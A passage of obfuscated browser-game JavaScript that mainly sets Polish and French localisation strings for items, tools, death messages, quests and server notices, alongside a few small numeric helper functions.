			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = ["Diamentowe drzwi", "Dla błyszczącego domu", "Wytrzymałość: 2500"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = ["Ametystowe drzwi", "Czy twój dom to zamknięty sejf?", "Wytrzymałość: 3000"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ] = ["Piec", "Ogrzewa cię", "Zużywa drewno co 5 sekund", ⵠ[342]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ] = ["Młyn", "Może produkować mąkę z pszenicy", "Przygotowanie mąki zajmuje 5 sekund", "Zwraca punkty podczas pracy", ⵠ[426]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = ["Piec do chleba", "Pozwala na wypiek chleba z mąki", "Przygotowanie chleba zajmuje 10 sekund", "Zwraca punkty podczas pracy", ⵠ[426]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = ["Kamień rezurekcyjny", "To magia", "Wskrzesi cię jeśli jesteś duchem", "Stracisz swoja broń i kilof", "Wytrzymałość: 200"];
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠⲆΔⲆⲆⲆ] = "Nie możesz dołączyć do tego serwera";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆᐃⲆΔΔᐃ] = "Wyrzucony: ";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⵠⵠΔⲆⲆ] = "Twój klucz jest aktualnie używany przez innego gracza";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⵠⵠΔᐃⵠ] = "Twój klucz jest nieprawidłowy";
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔⲆΔᐃⵠ] = "Posiadasz starszą wersję, musisz wyczyścić swoją pamięć";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔΔΔⵠⵠᐃ] = "Nie ma nowych minerałów, zwierząt, i jedzenia";
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆᐃⲆⵠⲆᐃ] = "Przeżyłeś 1 dzień";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⲆΔⵠᐃΔ] = "Przeżyłeś ";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆΔΔⲆᐃᐃ] = " dni";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔᐃⲆᐃⵠⵠ] = "Jesteś martwy ;-;";
			ΔⵠΔ[ⲆⲆΔ.ΔΔⵠⵠⲆⲆᐃ] = "Serwer nie może znaleźć miejsca na spawn! Spamuj przycisk zagraj! Lub wybierz inny serwer...";
			ΔⵠΔ[ⲆⲆΔ.ⵠᐃⵠⲆⵠΔΔ] = "Serwer jest pełny! Spamuj przycisk zagraj!";
			ΔⵠΔ[ⲆⲆΔ.EMPTY] = "Źródło jest puste";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⲆᐃⲆⲆⲆ] = "Ekwipunek jest pełny (użyj prawego przycisku myszy, żeby wyrzucić przedmiot)";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃΔⲆᐃⲆⲆ] = " jest martwy";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆⲆᐃᐃᐃ] = "To nie jest właściwe narzędzie";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠⲆΔⵠᐃ] = "Dołączyłeś do drużyny";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃᐃΔ] = "Jesteś martwy";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆΔᐃⲆⵠΔ] = " dołączył do drużyny";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⲆᐃᐃΔⲆ] = "Twoja drużyna została zniszczona";
			ΔⵠΔ[ⲆⲆΔ.ΔΔᐃᐃⵠⵠΔ] = " Opuściłeś drużynę";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠⵠⵠⵠᐃ] = " opuścił drużynę";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃΔⲆ] = "Ktoś ukradł twój żeton :>";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃⲆⲆⵠⲆ] = "Wybierz serwer";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] = "graczy";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆᐃⵠⲆⲆ] = "wszystkich graczy";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃΔᐃ] = "graczy w tym trybie";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⲆⲆᐃᐃ] = "Już wkrótce...";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]).placeholder = "Przydomek";
			ᐃᐃΔᐃ[ᐃⵠΔ] = ["Zostałeś zabity bez powodu"];
			ᐃᐃΔᐃ[ⵠΔΔ] = ["Umarłeś z głodu, jak nazwa gry wskazuje"];
			ᐃᐃΔᐃ[ᐃⲆΔⲆ] = ["Zamarzłeś na śmierć. Ale smutne", "Masz hipotermię. Następnym razem, zamiast tego spróbuj siedzieć obok ogniska."];
			ᐃᐃΔᐃ[ᐃᐃⲆⲆ] = ["Gracz zabił cię, mówiąc ci 'git gud.' ", "Zostałeś zamordowany przez gracza. Nie martw się, ten gracz też zginie, ewentualnie."];
			ᐃᐃΔᐃ[ᐃⵠⵠΔ] = ["Byłeś za blisko ogniska i spłonąłeś. Zły pomysł.", "Zginąłeś od ognia. Ogień cię rani. Idź i napisz o tym historię."];
			ᐃᐃΔᐃ[ⵠⵠΔⵠ] = ["Twoje ciało stało się gniazdem dla pajęczych jaj", "Pająk cię zabił. Przynajmniej to nie był królik."];
			ᐃᐃΔᐃ[ⵠᐃΔⵠⲆ] = ["Wilk już nie będzie głodował po zjedzeniu cię", "To nie są pieski.Wilki nie lubią jak się je głaszcze."];
			ᐃᐃΔᐃ[7] = ["Lis był dla ciebie za szybki", "Lis zmienił cię w pudło.Od kiedy zwierzęta mają magiczne zdolności?"];
			ᐃᐃΔᐃ[8] = ["Niedźwiedź chciał się tylko przytulić.", "Niedźwiedź był biedny. Nie jest mi przykro."];
			ᐃᐃΔᐃ[ⵠⲆⲆΔᐃ] = ["Zostałeś spalony na popiół przez smoka. Jakie to smutne.", "Zostałeś spłaszczony przez smoka. Być zmiażdżonym to okropny sposób na śmierć."];
			ᐃᐃΔᐃ[ⵠⵠⲆΔΔ] = ["Wskoczyłeś na kolczasty mur. Niezbyt dobry pomysł...", "Zostałeś zabity przez kolczasty mur. Większość ludzi ludzi jest wystarczająco rozsądna, aby nie dotykać spiczastych rzeczy."];
			ᐃᐃΔᐃ[11] = ["Nawet duch potrafi umrzeć.", "Nie udało ci się dokonać rezurekcji. To jest gra, więc żyjesz po śmierci, więc..."];
			ᐃᐃΔᐃ[ᐃᐃΔᐃⲆ] = ["Bakterie z twojego surowego mięsa zabiły cię. Ta gra jest zdecydowanie za trudna.", "Ty zabiłeś surowe mięso. Ono zabiło ciebię."];
			ᐃᐃΔᐃ[13] = ["Zginąłeś z pragnienia. Lepiej pić własny mocz."];
			ᐃᐃΔᐃ[14] = ["Czy wiedziałeś, że usta głodomorka są zawsze pod wodą podczas pływania? Teraz wiesz."];
			ᐃᐃΔᐃ[15] = ["Nie martw się, zasmakowałeś pirani.", "Zabawny fakt: Piranie jedzą ludzi, włączając ciebie."];
			ᐃᐃΔᐃ[ᐃⵠⲆⲆᐃⵠⵠ] = ["LapaMauve nie planuje abyś mógł zabić krakena", "Kraken rozwalił twoją czaszkę."];
			ᐃᐃΔᐃ[17] = ["Twoja skóra odpada, słońce cię zabija."];
			ᐃᐃΔᐃ[ΔⲆΔⲆⲆᐃⲆ] = ["Czosnek w twoich kieszeniach  ugotował ci mózg."];
			ᐃᐃΔᐃ[19] = ["Jako wampir, nie stałbym blisko ząbków czosnku."];
			ᐃᐃΔᐃ[20] = ["Zjadłeś czosnek jako wampir, czego oczekiwałeś?"];
			ᐃᐃΔᐃ[21] = ["Twoje ciało owija się w cierniste krzaki.Kiedy próbujesz uciec,twoja skóra odpada i twoje serce przestaje bić."];
			ⲆⲆΔΔⲆ = ⵠ[170];
			ΔⵠᐃⲆⲆⵠⲆ = ["Uuunnnggg... Głoduję", "Potrzebuję twojego mózgu Uuunnnggg...", "Świeże mięso tutaj.. Uuunnnggg", "Uuunnnggg... Jesteś pyszny", ⵠ[200], "Jeść... uuunnnggg...", "Czuję krew... Uuunnnggg"]
		};

		function ΔΔⲆⵠᐃⲆΔ(ᐃᐃΔⵠΔᐃⲆ, ΔⵠⲆⲆΔ) {
			ΔⲆⲆΔᐃᐃΔ(ⲆᐃΔⵠⲆ, ᐃᐃΔⵠΔᐃⲆ, ΔⵠⲆⲆΔ);
			const ΔᐃΔⵠᐃΔᐃ = ΔⲆⵠᐃᐃΔⲆ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[ΔⲆⵠ], ΔᐃΔᐃ[Δⵠᐃ], ΔᐃΔᐃ[ⵠΔΔ], ΔᐃΔᐃ[0]);
			const ΔΔⵠⲆΔᐃⵠⵠᐃ = ᐃᐃΔᐃⲆᐃⲆ(ΔᐃΔᐃ[ΔⲆⵠ], ΔᐃΔᐃ[ⲆⲆⲆᐃ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0]);
			const ⲆⲆⵠⵠⲆⲆΔ = ΔᐃΔⵠᐃΔᐃ ^ 47516;
			return ⲆⲆⵠⵠⲆⲆΔ
		}
		const ΔⵠⵠᐃΔᐃⲆ = ΔⲆᐃᐃⲆ;
		const ⵠⲆᐃᐃ = ᐃᐃⲆᐃ;
		const ΔⲆⵠⲆΔΔᐃ = ΔⲆⲆᐃᐃ;

		function ⲆⲆⵠⵠⲆⲆⵠ(ᐃⲆⵠΔⵠΔⵠ, ᐃᐃⲆⲆᐃⲆΔ, ⵠᐃᐃᐃⵠΔᐃ, ᐃᐃⵠⵠΔΔⲆ, ⲆⵠⲆⲆⲆⵠⲆ, ᐃΔΔⵠⲆᐃⲆ) {
			ᐃΔⲆⲆⲆⵠⲆ(ⲆᐃΔⵠⲆ, ᐃⲆⵠΔⵠΔⵠ, ᐃᐃⲆⲆᐃⲆΔ, ⵠᐃᐃᐃⵠΔᐃ, ᐃᐃⵠⵠΔΔⲆ, ⲆⵠⲆⲆⲆⵠⲆ, ᐃΔΔⵠⲆᐃⲆ);
			const ᐃᐃΔᐃᐃᐃⵠ = ᐃⵠΔᐃᐃⵠⲆ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[ⵠᐃⵠΔ]);
			const ⲆΔⵠⵠᐃᐃⲆ = ΔΔΔᐃᐃⲆⲆ(ΔᐃΔᐃ[ᐃⲆⵠᐃ], ΔᐃΔᐃ[ΔΔⵠΔ], ΔᐃΔᐃ[ⲆⲆⲆΔ], ΔᐃΔᐃ[ᐃΔΔⲆ]);
			const ΔⵠΔᐃⲆⵠⵠ = (48271 * (220 + (ᐃᐃΔᐃᐃᐃⵠ ^ ⲆΔⵠⵠᐃᐃⲆ)) + ᐃΔΔ) % 2147483647;
			return ΔⵠΔᐃⲆⵠⵠ
		}
		var ⲆⲆⲆᐃΔΔⵠ = function() {
			ΔⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ] = [ⵠ[207]];
			ᐃᐃΔᐃ[22] = [ⵠ[41]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ] = [ⵠ[169], ⵠ[59], ⵠ[57]];
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆΔᐃᐃⵠᐃ] = " RETOUR AU JEU";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠᐃᐃΔⵠ] = " Partage sur Twitter";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠᐃⲆⲆⲆΔ] = " Partage sur Facebook";
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔᐃᐃᐃⵠ] = "Tu peux acheter des objets dans le magasin à ta prochaine partie avec tes points";
			ΔⵠΔ[ⲆⲆΔ.POINTS] = ⵠ[250];
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔᐃᐃᐃⵠ] = ⵠ[165];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⵠΔΔΔ] = "Tués";
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃᐃⵠⲆⲆᐃ] = "Jours survécus";
			ΔⵠΔ[ⲆⲆΔ.ΔΔⲆΔⲆᐃⲆ] = "Mode de construction: Libre. Appuie sur G pour changer";
			ΔⵠΔ[ⲆⲆΔ.ΔⲆⲆΔᐃⲆᐃ] = "Mode de construction: Grille. Appuie sur G pour changer";
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ] = ["Pince de crabe", "Les pinces de crabes peuvent aussi être mangées", ⵠ[134]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ] = ["Lance en crabe", "Te permet de soigner les crabes et de les calmer", "Donne un bonus de +10 degats quand elle est portée", "avec un casque un crabe sur un Crab King", ⵠ[449], ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ] = ["Casque en crabe", "Tu es le Roi des Crabes!", "Les crabes te suivent", "Ils ne peuvent pas te frapper et toi non plus", ⵠ[68], ⵠ[388]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ] = ["Lit", "Repose-toi dans ce lit douillet", "Tu as moins froid, moins faim et moins soif", "Tu te régénères plus vite", ⵠ[463]];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[219])[ΔᐃⲆⵠⲆⵠΔ[290]] = "Chrono Quêtes";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[546])[ΔᐃⲆⵠⲆⵠΔ[290]] = "Temps Restant";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[185])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Contraintes";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[136])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Résultat";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[579])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Récompenses";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[327])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Collecte 1 Cœur de dragon dans la cave";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[322])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Récolte 1 améthyste";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[514])[ΔᐃⲆⵠⲆⵠΔ[290]] = "Survis sans perdre de vie";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[334])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Ouvre 5 coffres au trésor";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[233])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Sois pacifique";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[179])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Cuisine 100 pains en hiver, seul et sans retour en arrière";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[109])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Après 1 jour, survis en hiver";
			for (var ⵠᐃ = ᐃⵠⲆ; ⵠᐃ < 7; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[ⲆΔᐃⵠᐃ] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = "RÉCOMPENSE!";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[487])[ΔᐃⲆⵠⲆⵠΔ[290]] = " QUITTER";
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃΔᐃ] = ["Main"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ] = ["Terre", "C'est sale!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ] = ["Sable", "J'en ai dans les yeux"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ] = ["Bois", "Tu n'en auras jamais trop!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆ] = ["Pierre", "Aussi appelée roche"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠ] = ["Or", "Sois généreux, donne en aux autres"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔ] = ["Diamant", "Comme tes yeux! wesh"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆ] = ["Améthyste", "C'est Mauve comme Lapa"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = ["Farine", "Utile pour la cuisine"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ] = ["Cookie", "Un somptueux cookie de Grand-Mère", "Nourriture: 50"];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ] = ["Gâteau", "Pour les fins gourmets", "Nourriture: 100"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = ["Viande crue", "Tu peux la cuisiner avec du feu", "Intoxication: 10", "Nourriture: 15"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = ["Viande cuite", "Un steak saignant, s'il vous plait", "Nourriture: 35"];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔΔ] = ["Poisson cru", "Je crois que c'est encore vivant", "Intoxication: 10", "Nourriture: 18"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = ["Poisson cuit", "Avec du citron, c'est parfait", "Nourriture: 35"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ] = ["Baguette", "Une tradition s'il vous plait", "C'est la monnaie du marché", "Nourriture: 15"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ] = [ⵠ[239], "Le Jambon Beurre vaincra", "Nourriture: 100"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = ["Bonbons", "Il n'y a pas de dentiste ici", "Nourriture: 100"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ] = ["Canne à sucre", "Sans sucre de canne", "Nourriture: 20"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = ["Guirlandes", "Utilisable sur les toits"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ] = ["Graines de baies", "Deviennent des baies", "Naissance: 2min", "Croissance: 55s", "Arrosage: 3min 20s", ⵠ[105], ⵠ[567]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ] = ["Baies", "Peu nourrissant", "Nourriture: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ] = ["Graines de blé", "Deviennent du blé", "Naissance: 2min", "Croissance: 16s", "Arrosage: 2min", ⵠ[105], ⵠ[567]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = ["Blé", "Peut être transformé en farine dans les moulins"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ] = ["Graines de citrouille", "Deviennent des citrouilles", "Naissance: 2min 40s", "Croissance: 2min", "Arrosage: 2min", ⵠ[105], ⵠ[567]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ] = ["Citrouille", "Ça me rappelle Halloween", "Nourriture: 30"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = ["Graines d'ail", "Très dangereux pour les vampires", "Dégâts: 20", "Naissance: 4min", "Croissance: 1min 10s", "Arrosage: 1min 40s", ⵠ[105], ⵠ[567]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ] = ["Ail", "Soigne et réduit le froid", "Nourriture: 14", "Soigne sur le temps: 30", "Effet: 1 fois"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = ["Graines de ronces", "Peuvent blesser vos ennemis", "Dégâts: 20", "Naissance: 4min", "Croissance: 15s", "Arrosage: 3min", ⵠ[44], ⵠ[567]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ] = ["Ronces", "Ça pique!"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ] = ["Terreau", "Indispensable", "Vos plantes grandiront plus vite", "et auront besoin de moins d'eau", ⵠ[544]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ] = ["Glace", "Pratique pour faire de l'eau et des gâteaux"];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ] = ["Clé à molette", "Pour réparer les portes, les murs et les piques", ⵠ[91]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ] = ["Peau de loup", "Il était où le gentil ti Youki?"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = ["Peau de lapin", "Vous êtes un monstre"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ] = ["Fourrure blanche", "Tu es une usine à pain"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ] = ["Fourrure noire", "Tu te sens prêt à faire quelque chose de mal"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ] = ["Fourrure d'hiver", "Il voulait juste un calin"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = ["Écailles", "Ça sent le poisson!"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = ["Peau du kraken", "Tu n'as pas eu trop peur?"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ] = ["Feu de camp", "Réchauffe", "Durabilité: 150", "Durée de vie: 2min"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = ["Grand feu de camp", "Réchauffe plus longtemps", "Durabilité: 400", "Durée de vie: 6min"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ] = ["Établi", "Utile pour fabriquer toute sorte d'objets"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ] = ["Fil", "Utile pour faire des chapeaux et un sac"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔΔᐃ] = ["Fil de diamant", "Utile pour faire des chapeaux"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = ["Coffre", "Permet de ranger des objets", "Durabilité: 500"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ] = ["Épée en bois", "C'est pour les enfants", "Dégâts: 12", "Démolition: 4"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ] = ["Épée en pierre", "Sois gentil avec les autres", "Dégâts: 19", "Démolition: 6"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ] = ["Épée en or", "Roi de la forêt", "Dégâts: 22", "Démolition: 7"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ] = ["Épée en diamant", "Tu te sens puissant", "Dégâts: 24", "Démolition: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ] = ["Épée de pirate", "Marin d'eau douce!", "Meilleure portée qu'une épée normale", "Dégâts: 24", "Démolition: 8"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = ["Épée en améthyste", "Mauve est la plus belle couleur du monde", "Dégâts: 27", "Démolition: 9"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = ["Épée du Dragon", "Pas de pitié!", "Dégâts: 30", "Démolition: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = ["Lance du Dragon", "Tuez-les tous!", "Dégâts: 22", "Démolition: 6"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ] = ["Pioche en bois", "Peut récolter du bois et de la pierre", "Dégâts: 1"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⵠΔ] = ["Pioche en pierre", "Peut aussi récolter de l'or", ⵠ[91]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ] = ["Pioche en or", "Peut aussi récolter du diamant", "Dégâts: 3", "Démolition: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ] = ["Pioche en diamant", "Peut tout récolter", "Dégâts: 4", "Démolition: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ] = ["Pioche en améthyste", "Peut tout récolter", "Dégâts: 5", "Démolition: 1"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ] = ["Marteau en pierre", ⵠ[458], "Ne marche pas bien sur du diamant et améthyste", ⵠ[91], "Démolition: 20"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ] = ["Marteau en or", ⵠ[458], "Ne marche pas bien sur l'améthyste", "Dégâts: 3", "Démolition: 30"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = ["Marteau en diamant", ⵠ[458], "Dégâts: 4", "Démolition: 40"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = ["Marteau en améthyste", ⵠ[458], "Dégâts: 5", "Démolition: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = ["Super Marteau", "As-tu prévu de détruire le monde?", "Dégâts: 12", "Démolition: 70"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = ["Lance en bois", "Plus de peur que de mal", "Dégâts: 10", "Démolition: 2"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ] = ["Lance en pierre", "C'est le début de l'évolution", "Dégâts: 14", "Démolition: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ] = ["Lance en or", "Attention, ça pique!", "Dégâts: 15", "Buildings Dégâts: 5"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔΔΔ] = ["Lance en diamant", "Tu es prêt à tuer les dragons", "Dégâts: 17", "Buildings Dégâts: 5"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ] = ["Lance en améthyste", "Les dragons ne te font plus peur", "Dégâts: 18", "Buildings Dégâts: 6"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ] = ["Pelle en pierre", ⵠ[555], ⵠ[569], ⵠ[91]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ] = ["Pelle en or", ⵠ[555], ⵠ[569], "Dégâts: 3", "Buildings Dégâts: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ] = ["Pelle en diamant", ⵠ[555], ⵠ[569], "Dégâts: 4", "Buildings Dégâts: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ] = ["Pelle en améthyste", ⵠ[555], ⵠ[569], "Dégâts: 5", "Buildings Dégâts: 1"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ] = ["Casque en bois", "Mieux que rien", "Défense: 1", "Défense contre animaux: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ] = ["Casque en pierre", "Prêt pour la bataille", "Défense: 2", "Défense contre animaux: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ] = ["Casque en or", "Alias le casque des sauvages", "Défense: 4", "Défense contre animaux: 13"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ] = ["Casque en diamant", "Ne te vante pas trop", "Défense: 5", "Défense contre animaux: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ] = ["Casque en améthyste", "Tu n'as plus peur de rien", "Défense: 6", "Défense contre animaux: 23"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = ["Casque du Dragon", "Tu vas conquérir le monde", "Défense: 8", "Défense contre animaux: 27"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ] = ["Chapeau d'explorateur", "Les animaux t'ignorent", "Mais ne faites pas de bruit!", ⵠ[ⲆᐃᐃΔΔ]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ] = ["Chapeau du Père Noël", "Oh, oh, oh, Joyeux Nöel!", ⵠ[20]];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ] = ["Chapeau du lutin de Nöel", "Tu as vu le nouveau chef d'oeuvre d'Alain Chabat?", ⵠ[ⲆⵠᐃᐃⲆ]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ] = ["Capuche", "Voyou!", "Tu peux voler seulement si", "1) Il fait nuit", "2) Tu as les mains libres", "3) Tu n'as pas été touché depuis 8 secondes", "4) Tu es loin d'un feu", "5) Ta cible n'est pas un paysan", ⵠ[ΔᐃⲆⵠᐃ]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ] = ["Cache-oreilles", "Une sorte de petite chapka.", ⵠ[ⵠΔΔⲆᐃ]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = [ⵠ[308], "Comment ça va, camarade?", ⵠ[ⵠΔⵠⵠᐃ]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ] = ["Bonnet d'hiver", "Très confortable", "Très chaud"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ] = ["Tunique", "Les plantes poussent plus vite", ⵠ[ᐃΔᐃⲆⵠ]];
